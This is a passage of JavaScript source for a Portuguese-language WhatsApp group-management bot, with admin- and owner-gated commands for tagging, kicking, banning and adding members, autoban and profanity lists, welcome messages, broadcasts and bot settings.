for (let mem of groupMembers) {
teks += `*#* @${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
mentions(teks, members_id, true)
} catch {
reply('ERROR!!')
}
break

case 'marcar2':
try {
if (!isGroup) return reply('Este comando s√≥ deve ser utilizado em Grupo.')
if (!isGroupAdmins) return reply('Voc√™ precisa ser ADM pra utilizar este comando')  
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `‚ï†‚û• @${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
reply(teks)
} catch {
reply('ERROR!!')
}
break

case 'kick':
if (!isGroup) return reply('Este comando s√≥ deve ser utilizado em Grupo.')
if (!isGroupAdmins) return reply('Voc√™ precisa ser ADM pra utilizar este comando')
if (!isBotGroupAdmins) return reply('Bot precisa ser ADM, para executar esta fun√ß√£o.')
mentioned = args.join(" ").replace("@", "") + "@s.whatsapp.net"
if(numerodono.includes(mentioned)) return reply("N√£o pode remover meu dono üò°")
if(botNumber.includes(mentioned)) return reply("Voc√™ acha que vou banir eu mesmo??, troxa voc√™ em..")
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque a')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Pedidos recebidos, emitidos :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
conn.groupParticipantsUpdate(from, mentioned, 'remove')
} else {
mentions(`Pedidos recebidos, emitidos : @${mentioned[0].split('@')[0]}`, mentioned, true)
conn.groupParticipantsUpdate(from, mentioned, 'remove')
}
break

case 'reviver':
if (!isGroup) return reply('Esse comando so funciona em grupo, sinto muito')
if(!isGroupAdmins) return reply('‚ùå VOC√ä N√ÉO √â ADM PRA UTILIZAR ESTE COMANDO, DESCULPE, QUEM SABE UM DIA üòÇ')
if(!isBotGroupAdmins) return reply("N√£o sou adm pra executar esta a√ß√£o..")
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque uma mensagem do alvo!')
add = info.message.extendedTextMessage.contextInfo.participant
sleep(5000)
const response2 = await conn.groupParticipantsUpdate(from, [add], "add" )
reply('Usuario Adicionado de volta ao grupo.')
break

case 'add':
if(!SoDono) return reply('Comando Desativado por quest√µes de seguran√ßa, estava ocasionandoo Ban do n√∫mero do bot.')
if(!isGroupAdmins) return reply('‚ùå VOC√ä N√ÉO √â ADM PRA UTILIZAR ESTE COMANDO, DESCULPE, QUEM SABE UM DIA üòÇ')  
if(!isBotGroupAdmins) return reply("N√£o sou adm pra executar esta a√ß√£o..")
if(q.length < 1) return reply('Quer adicionar uma alma?')  
try {
tdt = args[0]
if(tdt.length < 1) return reply(`Digita o n√∫mero que deseja add, exemplo: ${prefix}add 558198923680`)
if (info.message.extendedTextMessage === null || info.message.extendedTextMessage === undefined) {
adduser = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(groupMetadata.participants.includes(adduser)) return reply('Esse membro j√° est√° no grupo, como voc√™ vai adicionar??? ')
reply('Irei adicionar ele(a) em 5 segundos...')  
setTimeout(async() => {
responser = await conn.groupParticipantsUpdate(from, [adduser], "add")
}, 5000)
o = responser.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('O alvo j√° est√° no grupo!')
if(inv[0].code == 403) return reply('Erro, conta privada do usu√°rio')
if(inv[0].code == 408) return reply('Erro, usu√°rio acabou de sair')
if(inv[0].code == 401) return reply('Erro, porque o bot est√° bloqueado pelo alvo ')
} else {
if(groupMetadata.participants.includes(adduser)) return reply('Esse membro j√° est√° no grupo, como voc√™ vai adicionar??? ')  
reply('Irei adicionar ele(a) em 5 segundos...')  
adduser = info.message.extendedTextMessage.contextInfo.participant
setTimeout(async() => {
responser =  await conn.groupParticipantsUpdate(from, [adduser], "add")
}, 5000)
o = responser.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('O alvo j√° est√° no grupo! ')
if(inv[0].code == 403) return reply('Falhou, porque em privado ')
if(inv[0].code == 408) return reply('Falha, porque o alvo acabou de sair ')
if(inv[0].code == 401) return reply('Falha, porque o bot est√° bloqueado pelo alvo ')
}
} catch {
reply('Izi, se n√£o for adicionado provavelmente ele privou s√≥ para contatos adicionar ele em grupo.')
}
break

case 'sairgp':
if(isGroup && !SoDono && !info.key.fromMe) return reply("Este comando s√≥ o bot ou o dono pode executar..")
try {
conn.groupLeave(from)
} catch(erro) {
reply(String(erro))
}
break

case 'ban': case 'banir':
if (!isGroup) return reply('Este comando s√≥ deve ser utilizado em Grupo.')
if (!isGroupAdmins) return reply('Voc√™ precisa ser ADM pra utilizar este comando')
if (!isBotGroupAdmins) return reply('Bot precisa ser ADM, para executar esta fun√ß√£o.')
if (info.message.extendedTextMessage != undefined || info.message.extendedTextMessage != null) {
num = info.message.extendedTextMessage.contextInfo.participant
if(botNumber.includes(num)) return reply('N√£o sou besta de remover eu mesmo n√© üôÅ, mas estou decepcionado com voc√™')
if(numerodono.includes(num)) return reply('N√£o posso remover meu dono ü§ß')
conn.sendMessage(from, {text: `Adeus ${num.split('@')[0]}`, mentions: [num]}, {quoted: info})
conn.groupParticipantsUpdate(from, [num], 'remove')
} else { 
reply('Responda a mensagem da pessoa')
}
break


//======‚â†(INFOS/EXECU√á√ÉO/DONO)‚â†=========\\


case 'autoban':
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
var ind = dbids.indexOf(from)
if(isAdeusCara) {
adeuscara[ind].actived = true
} else {
adeuscara.push({
groupId: from,
actived: true,
number: []
})
}
fs.writeFileSync('./datab/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`Ativou com sucesso o recurso de autoban neste grupo‚úîÔ∏è`)
} else if (Number(args[0]) === 0) {
var ind = dbids.indexOf(from)						
if(isAdeusCara) {
adeuscara[ind].actived = false
} else {
adeuscara.push({
groupId: from,
actived: false,
number: []
})
}
fs.writeFileSync('./datab/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`Desativou com sucesso o recurso de autoban neste grupo‚úîÔ∏è`)
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'listban':
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins) return reply(enviar.msg.adm)
var ind = dbids.indexOf(from)
if(!isAdeusCara) return reply('*Nenhum N√∫mero n√£o foi adicionado*')
teks = '*N√∫meros que vou moer na porrada se voltar üò°:*\n'
for(i=0;i<adeuscara[ind].number.length;++i) {
teks += `‚û§ *${adeuscara[ind].number[i]}*\n`
}
teks += '*Esses ai vou descer meu martelo do ban ü•µ*'
reply(teks)
break  

case 'listagp':
if (!SoDono && !isnit && !info.key.fromMe) return reply('```SOMENTE MEU DONO LIND√ÉO```')
tdufg = await store.chats.all()
ingfoo = await getGroup(tdufg)
teks1 = `*L I S T A  D E  G R U P O S*\n*Total de Grupos* : ${ingfoo.length}\n\n`
for (let i = 0; i < ingfoo.length; i++){
teks1 += `‚Ä¢ *Nome do Grupo* : ${ingfoo[i].subject}\n‚Ä¢ *Id do Grupo* : ${ingfoo[i].id}\n‚Ä¢ *Criado* : ${moment(`${ingfoo[i].creation}` * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss')}\n‚Ä¢ *Total de Membros* : ${ingfoo[i].participants.length}\n\n`
}
reply(teks1)
break

case 'addautorm':
case 'addautoban':
case 'listanegra':  
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if (args.length < 1) return reply('Cade o n√∫mero?')
var ind = dbids.indexOf(from)
if(isAdeusCara) {
listng = q.replace(new RegExp("[()+-/ +/]", "gi"), "")  
var numind = adeuscara[ind].number.indexOf(listng)
if(numind >= 0) return reply('*Esse N√∫mero ja esta incluso*')
adeuscara[ind].number.push(listng)
} else {
listng = q.replace(new RegExp("[()+-/ +/]", "gi"), "")    
adeuscara.push({
groupId: from,
actived: false,
number: [listng]
})
}
fs.writeFileSync('./datab/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`*N√∫mero adicionado a lista de autoban*`)
break

case 'delremover':
case 'delautorm':  
case 'delautoban': 
case 'tirardalista':  
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if (args.length < 1) return reply('Diga o numero sem espa√ßo, + ou tra√ßo')
if (isNaN(args[0])) return reply('Diga o numero sem espa√ßo, + ou tra√ßo')
var ind = dbids.indexOf(from)
if(!isAdeusCara) return reply('*Nenhum N√∫mero n√£o foi adicionado*')
var numind = adeuscara[ind].number.indexOf(args[0])
if(numind < 0) return reply('*Esse n√∫mero n√£o est√° incluso*')
adeuscara[ind].number.splice(numind, 1)
fs.writeFileSync('./datab/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`*N√∫mero removido a lista de autoban*`)
break

case 'removerinativos':  
if(!isGroup) return reply(enviar.msg.grupo)  
if(!SoDono && !isnit) return reply("S√≥ dono pode executar este comando..")
if(q.length < 1) return reply(`Exemplo: ${prefix}banghosts 0\n\nEle vai banir todos aqueles que t√° com 0 mensagens, mas fa√ßa isso apenas se passou um tempo com o bot armazenando mensagem dos membros ativos do grupo.`)
if(groupIdscount.indexOf(from) >= 0) {
for(let obj of groupMembers) {
if(numbersIds.indexOf(obj.id) >=0) { 
var indnum = numbersIds.indexOf(obj.id)
if(countMessage[ind].numbers[indnum].messages <= args[0]) {
if(groupAdmins.includes(obj.id)) {
mentions(`@${obj.id} ta liberado da inspe√ß√£o por ser admin`, [obj.id], true)
} else {
conn.groupParticipantsUpdate(from, [obj.id], 'remove')
}
}
} else {
if(groupAdmins.includes(obj.id)) {
mentions(`@${obj.id} ta liberado da inspe√ß√£o por ser admin`, [obj.id], true)
} else {
conn.groupParticipantsUpdate(from, [obj.id], 'remove')
}
}
}
}
break

case 'nick-dono':
if (!SoDono  && !isnit && !info.key.fromMe) return reply(enviar.msg.donosmt)  
NickDono = args.join(" ")
setting.NickDono = NickDono
fs.writeFileSync('./dono/settings.json', JSON.stringify(setting, null, '\t'))
reply(`O Nick Do Dono foi configurado para : ${setting.NickDono}`)
break

case 'numero-dono':
if (!SoDono && !isnit && !info.key.fromMe) return reply(enviar.msg.donosmt)  
reply(`O n√∫mero dono foi configurado com sucesso para : ${q}\n\n_ REINICIANDO EM 3. 2 . 1`)
numerodonoofc = setting.numerodono 
numerodonoofc = args.join(" ")
setting.numerodono = numerodonoofc
fs.writeFileSync('./dono/settings.json', JSON.stringify(setting, null, '\t'))
break

case 'prefixo-bot': case 'setprefix':
if (args.length < 1) return
if (!SoDono  && !isnit && !info.key.fromMe) return reply(enviar.msg.donosmt)
prefix = args[0]
setting.prefix = prefix
fs.writeFileSync('./dono/settings.json', JSON.stringify(setting, null, '\t'))
reply(`O prefixo foi alterado com sucesso para: ${setting.prefix}`)
break

case 'prefixo_tipo2':
case 'prefixo_tipo_off':  
if (!SoDono  && !isnit) return reply(enviar.msg.donosmt)
if(budy.includes(`prefixo_tipo2`)) {
if(args.length < 1) return reply(`Digite o prefixo que deseja :\nExemplo: ${prefix}prefixo_tipo2 -`)    
var prefixo2_ = {
prefixo: q
}
if(!fs.existsSync(`./func/prefixo/prefixo2_${from}.json`)) {
fs.writeFileSync(`./func/prefixo/prefixo2_${from}.json`, JSON.stringify(prefixo2_, null, 2))
reply(`Prefixo √∫nico s√≥ para este grupo foi criado com sucesso..\n\n Prefixo: ${q}`)
} else {
fs.unlinkSync(`./func/prefixo/prefixo2_${from}.json`) 
fs.writeFileSync(`./func/prefixo/prefixo2_${from}.json`, JSON.stringify(prefixo2_, null, 2))
reply(`Prefixo re-criado com sucesso de : ${prefixo2_on.prefixo} para : ${q}`)
}
} else if(budy.includes("prefixo_tipo_off")) {
if(!fs.existsSync(`./func/prefixo/prefixo2_${from}.json`)) return reply(`J√° est√° no prefixo original do bot, que √© : ${setting.prefix}`)
fs.unlinkSync(`./func/prefixo/prefixo2_${from}.json`)  
reply(`Parab√©ns, voltou ao prefixo original : ${setting.prefix}`)
}
break

case 'fotomenu':
case 'fundomenu':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if(!isQuotedImage) return reply("Marque uma imagem")
reply('Voc√™ deve marcar uma imagem 2 vez com esse comando..')
if ((isMedia && !info.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
imagem = await downloadContentFromMessage(boij, 'image')
owgi = Buffer.from([])
for await(const send of imagem) { owgi = Buffer.concat( [ owgi, send ] ) }
res = await upload(owgi)
logoslink.logo = logo
logo = res
fs.writeFileSync('./logos/logos.json', JSON.stringify(logoslink, null, '\t'))
reply(`A foto do menu foi alterada com sucesso para: ${logo}`)
} else {
reply(`Mande uma imagem/v√≠deo com a legenda ${prefix + command}`)
}
break

case 'setprefixs':
if (args.length < 1) return
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
prefix = args[0]
setting.prefix = prefix
fs.writeFileSync('./dono/settings.json', JSON.stringify(setting, null, '\t'))
reply(`O prefixo foi alterado com sucesso para: ${prefix}`)
break

case 'nomegp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
await conn.groupUpdateSubject(from, `${body.slice(9)}`)
await conn.sendMessage(from, {text: 'Sucesso, alterou o nome do grupo'}, {quoted: info})
break

case 'fotobot':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!isQuotedImage) return reply(`Envie fotos com legendas ${prefix}fotobot ou tags de imagem que j√° foram enviadas`)
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
await conn.updateProfilePicture(botNumber, buff)
reply('Obrigado pelo novo perfilüòó')
break

case 'bcgp':
case 'bcgc':  
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('.......')
fgp = await groupMembers
var nomor = info.participant
if (isMedia && !info.message.videoMessage || isQuotedImage) {
encmedia = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
for (let _ of fgp) {
conn.sendMessage(_.id, {image: buff}, {caption: `*„Äå TRANSMISS√ÉO „Äç*\n\nGrupo: ${groupName}\n N√∫mero: wa.me/${(sender.split('@')[0])}\nMensagem : ${body.slice(6)}`})
}
reply('')
} else {
for (let _ of fgp) {
sendMess(_.id, `*„Äå TRANSMISS√ÉO „Äç*\n\nGrupo : ${groupName}\n N√∫mero : wa.me/${(sender.split('@')[0])}\nMensagem : ${body.slice(6)}`)
}
reply('Grupo de transmiss√£o bem-sucedido')
} 
break

case 'dono1':
if (args.length < 1) return
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
dono1 = body.slice(8)
nescessario.dono1 = dono1
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`Agora contem um segundo dono(a) alterado com sucesso para: ${dono1}`)
break

case 'vemqrcode':
if(!SoDono) return reply("Apenas Dono..")
bla = fs.readFileSync("./GESTOR-QR.json")
conn.sendMessage(from, {document: bla, mimetype: 'document/json', fileName: 'GESTOR-QR.json'})
break

case 'dono2':
if (args.length < 1) return
if (!SoDono  && !isnit && !issupre && !ischyt) return reply(enviar.msg.donosmt)
dono2 = body.slice(8)
nescessario.dono2 = dono2
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`Agora contem um segundo dono(a) alterado com sucesso para: ${dono2}`)
break

case 'dono3':
if (args.length < 1) return
if (!SoDono  && !isnit && !issupre && !ischyt) return reply(enviar.msg.donosmt)
dono3 = body.slice(8)
nescessario.dono3 = dono3
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`Agora contem um terceiro dono(a) alterado com sucesso para: ${dono3}`)
break

case 'dono4':
if (args.length < 1) return
if (!SoDono  && !isnit && !issupre && !ischyt) return reply(enviar.msg.donosmt)
dono4 = body.slice(8)
nescessario.dono4 = dono4
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`Agora contem um quarto dono(a) alterado com sucesso para: ${dono4}`)
break

case 'dono5':
if (args.length < 1) return
if (!SoDono  && !isnit && !issupre && !ischyt) return reply(enviar.msg.donosmt)
dono5 = body.slice(8)
nescessario.dono5 = dono5
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`Agora contem um quinto dono(a) alterado com sucesso para: ${dono5}`)
break


case 'ausente': case 'off': case 'afk':
if(!SoDono) return reply("Comando especial para o dono.")
msgtmp = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
nmrdnofc = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "")
msgz = args.join(" ")

var catmsgaus = {
Ausente_Desde: msgtmp, 
Motivo_Da_Aus√™ncia: msgz
}

if(!fs.existsSync(`./func/afk/afk-@${nmrdnofc}.json`)) {
fs.writeFileSync(`./func/afk/afk-@${nmrdnofc}.json`,
JSON.stringify(catmsgaus, null, 2));
} else {
if (fs.existsSync("./func/afk/afk-@" + nmrdnofc + ".json")) {
fs.unlinkSync("./func/afk/afk-@" + nmrdnofc + ".json");
fs.writeFileSync(`./func/afk/afk-@${nmrdnofc}.json`,
JSON.stringify(catmsgaus, null, 2));
}
}
reply(`Mensagem de aus√™ncia criada com sucesso...`)
break

case 'ativo': case 'on': case 'voltei':
if(!SoDono) return reply("Comando especial para o dono.")
nmrdnofc = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "")
if (fs.existsSync("./func/afk/afk-@" + nmrdnofc + ".json")) {  
fs.unlinkSync("./func/afk/afk-@" + nmrdnofc + ".json");
reply("Bem vindo de volta, agora voc√™ est√° online üôÇ")
} else {
reply("Voc√™ n√£o registrou nenhuma mensagem de aus√™ncia...")
}
break

case 'reagir':
const reactionMessage = {
react: {
text: "‚ù§Ô∏è",
key: info.key
}
}
sendMsg = await conn.sendMessage(from, reactionMessage)
break

case 'limpar':
if(!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins) return reply(enviar.msg.adm)
clear = `üóëÔ∏è\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nüóëÔ∏è\n‚ù≤‚ùó‚ù≥ *L…™·¥ç·¥ò·¥á·¥¢·¥Ä ·¥Ö·¥á C ú·¥Ä·¥õ C·¥è…¥·¥Ñ ü·¥ú…™ÃÅ·¥Ö·¥Ä* ‚úÖ`
conn.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
break

case 'clearchat':
case 'limparchat':  
case 'limparmsg':  
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
await conn.chatModify({ clear: { message: { id: String, fromMe: true } } }, from, [])
reply("Chat limpo")
break

case 'addpalavra':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (args.length < 1) return reply( `Use assim : ${prefix + command} [palavr√£o]. exemplo ${prefix + command} puta`)
const bw = body.slice(12)
palavra.push(bw)
fs.writeFileSync('./datab/grupos/palavras.json', JSON.stringify(palavra))
reply('Palavr√£o adicionado com sucesso!')
await limitAdd(sender)
break

case 'delpalavra':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (args.length < 1) return reply( `Use assim : ${prefix + command} [palavr√£o]. exemplo ${prefix + command} puta`)
let dbw = body.slice(12)
palavra.splice(dbw)
fs.writeFileSync('./datab/grupos/palavras.json', JSON.stringify(palavra))
reply('Palavr√£o removido da lista com sucesso!')
await limitAdd(sender)
break

case 'listapalavr√£o': case 'listapalavra':
case 'listpalavra':
let lbw = `Esta √© a lista de palavr√£o\nTotal : ${palavra.length}\n`
for (let i of palavra) {
lbw += `‚û∏ ${i.replace(palavra)}\n`
}
await reply(lbw)
await limitAdd(sender)
break 

case 'legendabv':  
if(!isGroup) return reply('Este comando s√≥ deve ser utilizado em Grupo.')
if(!isGroupAdmins) return reply(`S√≥ ADM pode utilizar este comando.`)
if(args.length < 1) return reply('*Escreva a mensagem de boas-vindas*')
teks = body.slice(11)
if(isWelcomed) {
var ind = groupIdWelcomed.indexOf(from)
welcome_group[ind].msg = teks
fs.writeFileSync('./datab/grupos/welcomegp.json', JSON.stringify(welcome_group, null, 2) + '\n')
reply('*Mensagem de boas vindas alteradas com sucesso!*')
} else {
var json = {
id: from,
msg: teks
}
welcome_group.push(json)
fs.writeFileSync('./datab/grupos/welcomegp.json', JSON.stringify(welcome_group, null, 2) + '\n')
reply('*Mensagem de boas vindas criada com sucesso!*')
}
break

case 'legendasaiu':
if(!isGroup) return reply(`S√≥ em grupo pode utilizar este comando.`)
if(!isGroupAdmins) return reply(`S√≥ ADM pode utilizar este tipo de Comando.`)
if(args.length < 1) return reply('*Escreva a mensagem de sa√≠da*')
teks = body.slice(13)
if(isByed) {
var ind = groupIdBye.indexOf(from)
bye_group[ind].msg = teks
fs.writeFileSync('./datab/grupos/byegp.json', JSON.stringify(bye_group, null, 2) + '\n')
reply('*Mensagem de sa√≠da alteradas com sucesso!*')
} else {
var json = {
id: from,
msg: teks
}
bye_group.push(json)
fs.writeFileSync('./datab/grupos/byegp.json', JSON.stringify(bye_group, null, 2) + '\n')
reply('*Mensagem de sa√≠da criada com sucesso!*')
}
break

case 'legendabv2':  
if(!isGroup) return reply('Este comando s√≥ deve ser utilizado em Grupo.')
if(!isGroupAdmins) return reply(`S√≥ ADM pode utilizar este comando.`)
if(args.length < 1) return reply('*Escreva a mensagem de boas-vindas*')
teks = body.slice(12)
if(isWelcomed2) {
var ind = groupIdWelcomed2.indexOf(from)
welcome_group2[ind].msg = teks
fs.writeFileSync('./datab/grupos/welcomegp2.json', JSON.stringify(welcome_group2, null, 2) + '\n')
reply('*Mensagem de boas vindas2 alteradas com sucesso!*')
} else {
var json = {
id: from,
msg: teks
}
welcome_group2.push(json)
fs.writeFileSync('./datab/grupos/welcomegp2.json', JSON.stringify(welcome_group2, null, 2) + '\n')
reply('*Mensagem de boas vindas2 criada com sucesso!*')
}
break

case 'legendasaiu2':
if(!isGroup) return reply(`S√≥ em grupo pode utilizar este comando.`)
if(!isGroupAdmins) return reply(`S√≥ ADM pode utilizar este tipo de Comando.`)
if(args.length < 1) return reply('*Escreva a mensagem de sa√≠da*')
teks = body.slice(14)
if(isByed) {
var ind = groupIdBye.indexOf(from)
bye_group2[ind].msg = teks
fs.writeFileSync('./datab/grupos/byegp2.json', JSON.stringify(bye_group2, null, 2) + '\n')
reply('*Mensagem de sa√≠da2 alteradas com sucesso!*')
} else {
var json = {
id: from,
msg: teks
}
bye_group2.push(json)
fs.writeFileSync('./datab/grupos/byegp2.json', JSON.stringify(bye_group2, null, 2) + '\n')
reply('*Mensagem de sa√≠da2 criada com sucesso!*')
}
break

case 'deletar':  case 'apagar':  case 'delete':   case 'del':  case 'd':
if (!isGroup)return reply(enviar.msg.grupo)
conn.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: info.message.extendedTextMessage.contextInfo.stanzaId, participant: sender }})
.catch((err) => { 
console.log(err)
reply('A mensagem n√£o foi enviado pelo bot...')
})
break

case 'fundobemvindo':
case 'fundobv':  
if (!SoDono  && !isnit && !info.key.fromMe) return reply(enviar.msg.donosmt)
if(!isQuotedImage) return reply("Marque uma imagem")
reply('Voc√™ deve marcar uma imagem com esse comando, se n√£o for de primeira, tente novamente, ok? ')
if ((isMedia && !info.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
fundo1 = res
nescessario.fundo1 = fundo1
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`A imagem de bem vindo foi alterado com sucesso para: ${fundo1}`)
}
break

case 'fundosaiu':
if (!SoDono  && !isnit && !info.key.fromMe) return reply(enviar.msg.donosmt)
if(!isQuotedImage) return reply("Marque uma imagem")
reply('Voc√™ deve marcar uma imagem com esse comando, se n√£o for de primeira, tente novamente, ok? ')
if ((isMedia && !info.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
fundo2 = res
nescessario.fundo2 = fundo2
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`A imagem de saiu foi alterado com sucesso para: ${fundo2}`)
}
break

case 'antiligar':
case 'antiligacao':  
case 'antiliga√ß√£o':  
try {
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAnticall) return reply('Ja esta ativo')
anticall.push('Ativado')
fs.writeFileSync('./datab/usuarios/anticall.json', JSON.stringify(anticall))
reply('Ativou com sucesso o recurso de antiliga√ß√£o no bot‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
if (!isAnticall) return reply('Ja esta Desativado')  
fs.writeFileSync('./datab/usuarios/anticall.json', JSON.stringify([]))
reply('Desativou com sucesso o recurso de antiliga√ß√£o no bot‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
} catch {
reply('Falha ao ativar')
}
break

case 'antipvon':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe ) return reply('Apenas Meu Dono')
if (banChats) return await reply('j√° est√° ativo o modo antipv')
banChats = true
nescessario.banChats = banChats
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
await conn.sendMessage(from, {text: "*Sucesso alterado para modo antipv, pv n√£o poder√° ser utilizado"})
break

case 'antipvoff':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return await reply('Apenas meu dono o owner')
if (!banChats) return await reply('Nao estava ativado ainda')
banChats = false
nescessario.banChats = banChats
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
await conn.sendMessage(from, {text: "*Sucesso modo antipv desligado, pv liberado."})
break

case 'antipv':
if (!SoDono) return reply(`Apenas dono pode ativar/desativar essa fun√ß√£o..`)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntiPv) return reply('Ja esta ativo')
antipv.push('Ativado')
fs.writeFileSync('./datab/usuarios/antipv.json', JSON.stringify(antipv))
reply('üåÄ Ativou com sucesso o recurso de Anti Privado üìù')
} else if (Number(args[0]) === 0) {
if (!isAntiPv) return reply('Ja esta Desativado')
pesquisar = 'Ativado'
processo = antipv.indexOf(pesquisar)
while(processo >= 0){
antipv.splice(processo, 1)
processo = antipv.indexOf(pesquisar)
}
fs.writeFileSync('./datab/usuarios/antipv.json', JSON.stringify(welkom))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso De ANTIPV‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'block':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return  reply(enviar.msg.donosmt)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return 
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.push(`${mentioned}`)
fs.writeFileSync('./datab/usuarios/banned.json', JSON.stringify(ban))
susp = `üö´@${mentioned[0].split('@')[0]} foi banido e n√£o poder√° mais usar os comandos do botüö´`
mentions(`${susp}`, mentioned, true)   
break

case 'unblock':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return  reply(enviar.msg.donosmt)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return 
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.splice(`${mentioned}`)
